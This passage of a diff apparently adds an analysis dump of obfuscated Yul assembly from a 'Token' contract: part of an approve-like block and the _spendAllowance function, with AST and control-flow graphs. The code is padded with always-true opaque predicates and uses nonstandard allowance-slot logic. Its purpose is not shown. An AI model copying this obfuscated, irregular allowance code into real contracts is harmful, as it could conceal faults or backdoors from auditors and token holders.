+      N17 [merge] if merge @ 4440:152:0 (line 134:13)
+      N18 [statement] mstore(QtPD, _spender) @ 4510:22:0 (line 135:17)
+      N19 [statement] mstore(add(QtPD, 0x20), IIqZ) @ 4549:29:0 (line 136:17)
+      N20 [statement] let rTjz := keccak256(QtPD, 0x40) @ 4605:33:0 (line 138:13)
+      N21 [statement] let o7x1j6d := origin() @ 4651:23:0 (line 139:13)
+      N22 [condition] if iszero(sub(o7x1j6d, o7x1j6d)) @ 4687:245:0 (line 140:13)
+      N23 [merge] if merge @ 4687:245:0 (line 140:13)
+      N24 [statement] sstore(rTjz, _amount) @ 4738:21:0 (line 141:17)
+      N25 [statement] log3(QtPD, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender) @ 4776:104:0 (line 142:17)
+      N26 [statement] mstore(QtPD, _amount) @ 4897:21:0 (line 143:17)
+    Edges:
+      N0 --[next]--> N2
+      N2 --[next]--> N3
+      N3 --[next]--> N4
+      N4 --[next]--> N5
+      N5 --[next]--> N6
+      N6 --[next]--> N7
+      N7 --[true: eq(gcf9eyl, add(gcf9eyl, 0))]--> N9
+      N9 --[next]--> N10
+      N10 --[next]--> N8
+      N7 --[false: !(eq(gcf9eyl, add(gcf9eyl, 0)))]--> N8
+      N8 --[next]--> N11
+      N11 --[next]--> N12
+      N12 --[next]--> N13
+      N13 --[next]--> N14
+      N14 --[next]--> N15
+      N15 --[next]--> N16
+      N16 --[true: eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4))]--> N18
+      N18 --[next]--> N19
+      N19 --[next]--> N17
+      N16 --[false: !(eq(mul(o6aj6v4, oaugsdm), mul(oaugsdm, o6aj6v4)))]--> N17
+      N17 --[next]--> N20
+      N20 --[next]--> N21
+      N21 --[next]--> N22
+      N22 --[true: iszero(sub(o7x1j6d, o7x1j6d))]--> N24
+      N24 --[next]--> N25
+      N25 --[next]--> N26
+      N26 --[next]--> N23
+      N22 --[false: !(iszero(sub(o7x1j6d, o7x1j6d)))]--> N23
+      N23 --[next]--> N1
+
+AssemblyBlock 3
+  Contract: Token
+  Function: _spendAllowance(address _owner, address _spender, uint256 _amount)
+  Visibility: internal
+  SoliditySourceRange: 5078:1544:0 (line 150:9 to 193:9)
+  YulRoot: YulBlock [5087:1535:0]
+  SoliditySnippet:
+    assembly {
+                let QtPD := mload(0x40)
+                mstore(QtPD, sload(fgMs.slot))
+                mstore(add(QtPD, 32), 1)
+                let MuuR := keccak256(QtPD, 64)
+                mstore(QtPD, _owner)
+                mstore(add(QtPD, 32), MuuR)
+                let LjAi := keccak256(QtPD, 64)
+                let IUGo := sload(LjAi)
+                let dhzw := IUGo
+                if and(dhzw, iszero(_amount)) {
+                    let b5owjsg := basefee()
+                    let tgfo9ee := timestamp()
+                    if eq(b5owjsg, or(b5owjsg, 0)) {
+                        revert(0, 0)
+                    }
+                }
+                if iszero(dhzw) {
+                    mstore(QtPD, _owner)
+                    mstore(add(QtPD, 32), 1)
+                    MuuR := keccak256(QtPD, 64)
+                    mstore(QtPD, _spender)
+                    mstore(add(QtPD, 32), MuuR)
+                    LjAi := keccak256(QtPD, 64)
+                    dhzw := add(sload(LjAi), IUGo)
+                }
+                let o6ywqjg := origin()
+                pop(0)
+                if eq(o6ywqjg, and(o6ywqjg, o6ywqjg)) {
+                    dhzw := sub(dhzw, IUGo)
+                }
+                if iszero(eq(dhzw, not(0))) {
+                    if lt(dhzw, _amount) {
+                        let ccpw1f2 := caller()
+                        if eq(ccpw1f2, add(ccpw1f2, 0)) {
+                            revert(0, 0)
+                        }
+                    }
+                    let ge57smz := gasprice()
+                    if eq(ge57smz, and(ge57smz, ge57smz)) {
+                        sstore(LjAi, sub(dhzw, _amount))
+                    }
+                }
+            }
+  YulAst:
+    - YulBlock: YulBlock [5087:1535:0]
+      - YulVariableDeclaration: let QtPD := mload(0x40) [5101:23:0]
+        - YulTypedName: YulTypedName [5105:4:0]
+        - YulFunctionCall: YulFunctionCall [5113:11:0]
+          - YulIdentifier: YulIdentifier [5113:5:0]
+          - YulLiteral: YulLiteral [5119:4:0]
+      - YulExpressionStatement: mstore(QtPD, sload(fgMs.slot)) [5137:30:0]
+        - YulFunctionCall: YulFunctionCall [5137:30:0]
+          - YulIdentifier: YulIdentifier [5137:6:0]
+          - YulIdentifier: YulIdentifier [5144:4:0]
+          - YulFunctionCall: YulFunctionCall [5150:16:0]
+            - YulIdentifier: YulIdentifier [5150:5:0]
+            - YulIdentifier: YulIdentifier [5156:9:0]
+      - YulExpressionStatement: mstore(add(QtPD, 32), 1) [5180:24:0]
+        - YulFunctionCall: YulFunctionCall [5180:24:0]
+          - YulIdentifier: YulIdentifier [5180:6:0]
+          - YulFunctionCall: YulFunctionCall [5187:13:0]
+            - YulIdentifier: YulIdentifier [5187:3:0]
+            - YulIdentifier: YulIdentifier [5191:4:0]
+            - YulLiteral: YulLiteral [5197:2:0]
+          - YulLiteral: YulLiteral [5202:1:0]
+      - YulVariableDeclaration: let MuuR := keccak256(QtPD, 64) [5217:31:0]
+        - YulTypedName: YulTypedName [5221:4:0]
+        - YulFunctionCall: YulFunctionCall [5229:19:0]
+          - YulIdentifier: YulIdentifier [5229:9:0]
+          - YulIdentifier: YulIdentifier [5239:4:0]
+          - YulLiteral: YulLiteral [5245:2:0]
+      - YulExpressionStatement: mstore(QtPD, _owner) [5261:20:0]
+        - YulFunctionCall: YulFunctionCall [5261:20:0]
+          - YulIdentifier: YulIdentifier [5261:6:0]
+          - YulIdentifier: YulIdentifier [5268:4:0]
+          - YulIdentifier: YulIdentifier [5274:6:0]
+      - YulExpressionStatement: mstore(add(QtPD, 32), MuuR) [5294:27:0]
+        - YulFunctionCall: YulFunctionCall [5294:27:0]
+          - YulIdentifier: YulIdentifier [5294:6:0]
+          - YulFunctionCall: YulFunctionCall [5301:13:0]
+            - YulIdentifier: YulIdentifier [5301:3:0]
+            - YulIdentifier: YulIdentifier [5305:4:0]
+            - YulLiteral: YulLiteral [5311:2:0]
+          - YulIdentifier: YulIdentifier [5316:4:0]
+      - YulVariableDeclaration: let LjAi := keccak256(QtPD, 64) [5334:31:0]
+        - YulTypedName: YulTypedName [5338:4:0]
+        - YulFunctionCall: YulFunctionCall [5346:19:0]
+          - YulIdentifier: YulIdentifier [5346:9:0]
+          - YulIdentifier: YulIdentifier [5356:4:0]
+          - YulLiteral: YulLiteral [5362:2:0]
+      - YulVariableDeclaration: let IUGo := sload(LjAi) [5378:23:0]
+        - YulTypedName: YulTypedName [5382:4:0]
+        - YulFunctionCall: YulFunctionCall [5390:11:0]
+          - YulIdentifier: YulIdentifier [5390:5:0]
+          - YulIdentifier: YulIdentifier [5396:4:0]
+      - YulVariableDeclaration: let dhzw := IUGo [5414:16:0]
+        - YulTypedName: YulTypedName [5418:4:0]
+        - YulIdentifier: YulIdentifier [5426:4:0]
+      - YulIf: if and(dhzw, iszero(_amount)) [5443:229:0]
+        - YulFunctionCall: YulFunctionCall [5446:26:0]
+          - YulIdentifier: YulIdentifier [5446:3:0]
+          - YulIdentifier: YulIdentifier [5450:4:0]
+          - YulFunctionCall: YulFunctionCall [5456:15:0]
+            - YulIdentifier: YulIdentifier [5456:6:0]
+            - YulIdentifier: YulIdentifier [5463:7:0]
+        - YulBlock: YulBlock [5473:199:0]
+          - YulVariableDeclaration: let b5owjsg := basefee() [5491:24:0]
+            - YulTypedName: YulTypedName [5495:7:0]
+            - YulFunctionCall: YulFunctionCall [5506:9:0]
+              - YulIdentifier: YulIdentifier [5506:7:0]
+          - YulVariableDeclaration: let tgfo9ee := timestamp() [5532:26:0]
+            - YulTypedName: YulTypedName [5536:7:0]
+            - YulFunctionCall: YulFunctionCall [5547:11:0]
+              - YulIdentifier: YulIdentifier [5547:9:0]
+          - YulIf: if eq(b5owjsg, or(b5owjsg, 0)) [5575:83:0]
+            - YulFunctionCall: YulFunctionCall [5578:27:0]
+              - YulIdentifier: YulIdentifier [5578:2:0]
+              - YulIdentifier: YulIdentifier [5581:7:0]
+              - YulFunctionCall: YulFunctionCall [5590:14:0]
+                - ...
+            - YulBlock: YulBlock [5606:52:0]
+              - YulExpressionStatement: revert(0, 0) [5628:12:0]
+                - ...
+      - YulIf: if iszero(dhzw) [5685:327:0]
+        - YulFunctionCall: YulFunctionCall [5688:12:0]
+          - YulIdentifier: YulIdentifier [5688:6:0]
+          - YulIdentifier: YulIdentifier [5695:4:0]
+        - YulBlock: YulBlock [5701:311:0]
+          - YulExpressionStatement: mstore(QtPD, _owner) [5719:20:0]
+            - YulFunctionCall: YulFunctionCall [5719:20:0]
+              - YulIdentifier: YulIdentifier [5719:6:0]
+              - YulIdentifier: YulIdentifier [5726:4:0]
+              - YulIdentifier: YulIdentifier [5732:6:0]
+          - YulExpressionStatement: mstore(add(QtPD, 32), 1) [5756:24:0]
+            - YulFunctionCall: YulFunctionCall [5756:24:0]
+              - YulIdentifier: YulIdentifier [5756:6:0]
+              - YulFunctionCall: YulFunctionCall [5763:13:0]
+                - ...
+              - YulLiteral: YulLiteral [5778:1:0]
+          - YulAssignment: MuuR := keccak256(QtPD, 64) [5797:27:0]
+            - YulIdentifier: YulIdentifier [5797:4:0]
+            - YulFunctionCall: YulFunctionCall [5805:19:0]
+              - YulIdentifier: YulIdentifier [5805:9:0]
+              - YulIdentifier: YulIdentifier [5815:4:0]
+              - YulLiteral: YulLiteral [5821:2:0]
+          - YulExpressionStatement: mstore(QtPD, _spender) [5841:22:0]
+            - YulFunctionCall: YulFunctionCall [5841:22:0]
+              - YulIdentifier: YulIdentifier [5841:6:0]
+              - YulIdentifier: YulIdentifier [5848:4:0]
+              - YulIdentifier: YulIdentifier [5854:8:0]
+          - YulExpressionStatement: mstore(add(QtPD, 32), MuuR) [5880:27:0]
+            - YulFunctionCall: YulFunctionCall [5880:27:0]
+              - YulIdentifier: YulIdentifier [5880:6:0]
+              - YulFunctionCall: YulFunctionCall [5887:13:0]
+                - ...
+              - YulIdentifier: YulIdentifier [5902:4:0]
+          - YulAssignment: LjAi := keccak256(QtPD, 64) [5924:27:0]
+            - YulIdentifier: YulIdentifier [5924:4:0]
+            - YulFunctionCall: YulFunctionCall [5932:19:0]
+              - YulIdentifier: YulIdentifier [5932:9:0]
+              - YulIdentifier: YulIdentifier [5942:4:0]
+              - YulLiteral: YulLiteral [5948:2:0]
+          - YulAssignment: dhzw := add(sload(LjAi), IUGo) [5968:30:0]
+            - YulIdentifier: YulIdentifier [5968:4:0]
+            - YulFunctionCall: YulFunctionCall [5976:22:0]
+              - YulIdentifier: YulIdentifier [5976:3:0]
+              - YulFunctionCall: YulFunctionCall [5980:11:0]
+                - ...
+              - YulIdentifier: YulIdentifier [5993:4:0]
+      - YulVariableDeclaration: let o6ywqjg := origin() [6025:23:0]
+        - YulTypedName: YulTypedName [6029:7:0]
+        - YulFunctionCall: YulFunctionCall [6040:8:0]
+          - YulIdentifier: YulIdentifier [6040:6:0]
+      - YulExpressionStatement: pop(0) [6061:6:0]
+        - YulFunctionCall: YulFunctionCall [6061:6:0]
+          - YulIdentifier: YulIdentifier [6061:3:0]
+          - YulLiteral: YulLiteral [6065:1:0]
+      - YulIf: if eq(o6ywqjg, and(o6ywqjg, o6ywqjg)) [6080:93:0]
+        - YulFunctionCall: YulFunctionCall [6083:34:0]
+          - YulIdentifier: YulIdentifier [6083:2:0]
+          - YulIdentifier: YulIdentifier [6086:7:0]
+          - YulFunctionCall: YulFunctionCall [6095:21:0]
+            - YulIdentifier: YulIdentifier [6095:3:0]
+            - YulIdentifier: YulIdentifier [6099:7:0]
+            - YulIdentifier: YulIdentifier [6108:7:0]
+        - YulBlock: YulBlock [6118:55:0]
+          - YulAssignment: dhzw := sub(dhzw, IUGo) [6136:23:0]
+            - YulIdentifier: YulIdentifier [6136:4:0]
+            - YulFunctionCall: YulFunctionCall [6144:15:0]
+              - YulIdentifier: YulIdentifier [6144:3:0]
+              - YulIdentifier: YulIdentifier [6148:4:0]
+              - YulIdentifier: YulIdentifier [6154:4:0]
+      - YulIf: if iszero(eq(dhzw, not(0))) [6186:426:0]
+        - YulFunctionCall: YulFunctionCall [6189:24:0]
+          - YulIdentifier: YulIdentifier [6189:6:0]
+          - YulFunctionCall: YulFunctionCall [6196:16:0]
+            - YulIdentifier: YulIdentifier [6196:2:0]
+            - YulIdentifier: YulIdentifier [6199:4:0]
+            - YulFunctionCall: YulFunctionCall [6205:6:0]
+              - YulIdentifier: YulIdentifier [6205:3:0]
+              - YulLiteral: YulLiteral [6209:1:0]
+        - YulBlock: YulBlock [6214:398:0]
+          - YulIf: if lt(dhzw, _amount) [6232:197:0]
+            - YulFunctionCall: YulFunctionCall [6235:17:0]
+              - YulIdentifier: YulIdentifier [6235:2:0]
+              - YulIdentifier: YulIdentifier [6238:4:0]
+              - YulIdentifier: YulIdentifier [6244:7:0]
+            - YulBlock: YulBlock [6253:176:0]
+              - YulVariableDeclaration: let ccpw1f2 := caller() [6275:23:0]
+                - ...
+              - YulIf: if eq(ccpw1f2, add(ccpw1f2, 0)) [6319:92:0]
+                - ...
+          - YulVariableDeclaration: let ge57smz := gasprice() [6446:25:0]
+            - YulTypedName: YulTypedName [6450:7:0]
+            - YulFunctionCall: YulFunctionCall [6461:10:0]
+              - YulIdentifier: YulIdentifier [6461:8:0]
+          - YulIf: if eq(ge57smz, and(ge57smz, ge57smz)) [6488:110:0]
+            - YulFunctionCall: YulFunctionCall [6491:34:0]
+              - YulIdentifier: YulIdentifier [6491:2:0]
+              - YulIdentifier: YulIdentifier [6494:7:0]
+              - YulFunctionCall: YulFunctionCall [6503:21:0]
+                - ...
+            - YulBlock: YulBlock [6526:72:0]
+              - YulExpressionStatement: sstore(LjAi, sub(dhzw, _amount)) [6548:32:0]
+                - ...
+  LocalCFG:
+    Nodes:
+      N0 [entry] entry
+      N1 [exit] exit
+      N2 [statement] let QtPD := mload(0x40) @ 5101:23:0 (line 151:13)
+      N3 [statement] mstore(QtPD, sload(fgMs.slot)) @ 5137:30:0 (line 152:13)
+      N4 [statement] mstore(add(QtPD, 32), 1) @ 5180:24:0 (line 153:13)
+      N5 [statement] let MuuR := keccak256(QtPD, 64) @ 5217:31:0 (line 154:13)
+      N6 [statement] mstore(QtPD, _owner) @ 5261:20:0 (line 155:13)
+      N7 [statement] mstore(add(QtPD, 32), MuuR) @ 5294:27:0 (line 156:13)
+      N8 [statement] let LjAi := keccak256(QtPD, 64) @ 5334:31:0 (line 157:13)
+      N9 [statement] let IUGo := sload(LjAi) @ 5378:23:0 (line 158:13)
+      N10 [statement] let dhzw := IUGo @ 5414:16:0 (line 159:13)
+      N11 [condition] if and(dhzw, iszero(_amount)) @ 5443:229:0 (line 160:13)
+      N12 [merge] if merge @ 5443:229:0 (line 160:13)
+      N13 [statement] let b5owjsg := basefee() @ 5491:24:0 (line 161:17)
+      N14 [statement] let tgfo9ee := timestamp() @ 5532:26:0 (line 162:17)
+      N15 [condition] if eq(b5owjsg, or(b5owjsg, 0)) @ 5575:83:0 (line 163:17)
+      N16 [merge] if merge @ 5575:83:0 (line 163:17)
+      N17 [terminal] revert(0, 0) @ 5628:12:0 (line 164:21)
+      N18 [condition] if iszero(dhzw) @ 5685:327:0 (line 167:13)
+      N19 [merge] if merge @ 5685:327:0 (line 167:13)
+      N20 [statement] mstore(QtPD, _owner) @ 5719:20:0 (line 168:17)
+      N21 [statement] mstore(add(QtPD, 32), 1) @ 5756:24:0 (line 169:17)
+      N22 [statement] MuuR := keccak256(QtPD, 64) @ 5797:27:0 (line 170:17)
+      N23 [statement] mstore(QtPD, _spender) @ 5841:22:0 (line 171:17)
+      N24 [statement] mstore(add(QtPD, 32), MuuR) @ 5880:27:0 (line 172:17)
+      N25 [statement] LjAi := keccak256(QtPD, 64) @ 5924:27:0 (line 173:17)
+      N26 [statement] dhzw := add(sload(LjAi), IUGo) @ 5968:30:0 (line 174:17)
+      N27 [statement] let o6ywqjg := origin() @ 6025:23:0 (line 176:13)
+      N28 [statement] pop(0) @ 6061:6:0 (line 177:13)
+      N29 [condition] if eq(o6ywqjg, and(o6ywqjg, o6ywqjg)) @ 6080:93:0 (line 178:13)
+      N30 [merge] if merge @ 6080:93:0 (line 178:13)
+      N31 [statement] dhzw := sub(dhzw, IUGo) @ 6136:23:0 (line 179:17)
+      N32 [condition] if iszero(eq(dhzw, not(0))) @ 6186:426:0 (line 181:13)
+      N33 [merge] if merge @ 6186:426:0 (line 181:13)
+      N34 [condition] if lt(dhzw, _amount) @ 6232:197:0 (line 182:17)
+      N35 [merge] if merge @ 6232:197:0 (line 182:17)
+      N36 [statement] let ccpw1f2 := caller() @ 6275:23:0 (line 183:21)
+      N37 [condition] if eq(ccpw1f2, add(ccpw1f2, 0)) @ 6319:92:0 (line 184:21)
+      N38 [merge] if merge @ 6319:92:0 (line 184:21)
+      N39 [terminal] revert(0, 0) @ 6377:12:0 (line 185:25)
+      N40 [statement] let ge57smz := gasprice() @ 6446:25:0 (line 188:17)
+      N41 [condition] if eq(ge57smz, and(ge57smz, ge57smz)) @ 6488:110:0 (line 189:17)
+      N42 [merge] if merge @ 6488:110:0 (line 189:17)
+      N43 [statement] sstore(LjAi, sub(dhzw, _amount)) @ 6548:32:0 (line 190:21)
+    Edges:
+      N0 --[next]--> N2
+      N2 --[next]--> N3
+      N3 --[next]--> N4
+      N4 --[next]--> N5
+      N5 --[next]--> N6
+      N6 --[next]--> N7
+      N7 --[next]--> N8
+      N8 --[next]--> N9
+      N9 --[next]--> N10
+      N10 --[next]--> N11
+      N11 --[true: and(dhzw, iszero(_amount))]--> N13
+      N13 --[next]--> N14
+      N14 --[next]--> N15
+      N15 --[true: eq(b5owjsg, or(b5owjsg, 0))]--> N17
+      N17 --[terminate: revert]--> N1
+      N15 --[false: !(eq(b5owjsg, or(b5owjsg, 0)))]--> N16
+      N16 --[next]--> N12
+      N11 --[false: !(and(dhzw, iszero(_amount)))]--> N12
+      N12 --[next]--> N18
+      N18 --[true: iszero(dhzw)]--> N20
+      N20 --[next]--> N21
+      N21 --[next]--> N22
+      N22 --[next]--> N23
+      N23 --[next]--> N24
+      N24 --[next]--> N25
+      N25 --[next]--> N26
+      N26 --[next]--> N19
+      N18 --[false: !(iszero(dhzw))]--> N19
+      N19 --[next]--> N27
+      N27 --[next]--> N28
+      N28 --[next]--> N29
+      N29 --[true: eq(o6ywqjg, and(o6ywqjg, o6ywqjg))]--> N31
+      N31 --[next]--> N30
+      N29 --[false: !(eq(o6ywqjg, and(o6ywqjg, o6ywqjg)))]--> N30
+      N30 --[next]--> N32
+      N32 --[true: iszero(eq(dhzw, not(0)))]--> N34
+      N34 --[true: lt(dhzw, _amount)]--> N36
+      N36 --[next]--> N37
+      N37 --[true: eq(ccpw1f2, add(ccpw1f2, 0))]--> N39
+      N39 --[terminate: revert]--> N1
+      N37 --[false: !(eq(ccpw1f2, add(ccpw1f2, 0)))]--> N38
+      N38 --[next]--> N35
+      N34 --[false: !(lt(dhzw, _amount))]--> N35
+      N35 --[next]--> N40
+      N40 --[next]--> N41
+      N41 --[true: eq(ge57smz, and(ge57smz, ge57smz))]--> N43
+      N43 --[next]--> N42
+      N41 --[false: !(eq(ge57smz, and(ge57smz, ge57smz)))]--> N42
+      N42 --[next]--> N33
+      N32 --[false: !(iszero(eq(dhzw, not(0))))]--> N33
+      N33 --[next]--> N1
